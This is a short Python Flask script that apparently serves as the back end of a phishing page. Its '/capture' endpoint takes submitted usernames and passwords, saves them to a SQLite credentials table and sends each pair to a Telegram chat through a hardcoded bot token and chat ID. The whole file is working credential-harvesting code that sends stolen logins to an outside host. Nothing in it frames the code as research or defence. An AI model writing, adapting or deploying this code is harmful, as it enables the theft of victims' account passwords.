from flask import Flask, request
import sqlite3

app = Flask(name)

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form['username']
    password = request.form['password']
    save_to_db(username, password)
    send_to_telegram(username, password)
    return 'Data captured'

def save_to_db(username, password):
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("INSERT INTO credentials (username, password) VALUES (?, ?)", (username, password))
    conn.commit()
    conn.close()

def send_to_telegram(username, password):
    import requests
    bot_token = '7343417675:AAFgki0qTwT6c-KIa4dNmLoJT-WCfm9NGIM'
    chat_id = '922817542'
    message = f"Username: {username}\nPassword: {password}"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    requests.post(url, data={'chat_id': chat_id, 'text': message})

if name == 'main':
    app.run(debug=True)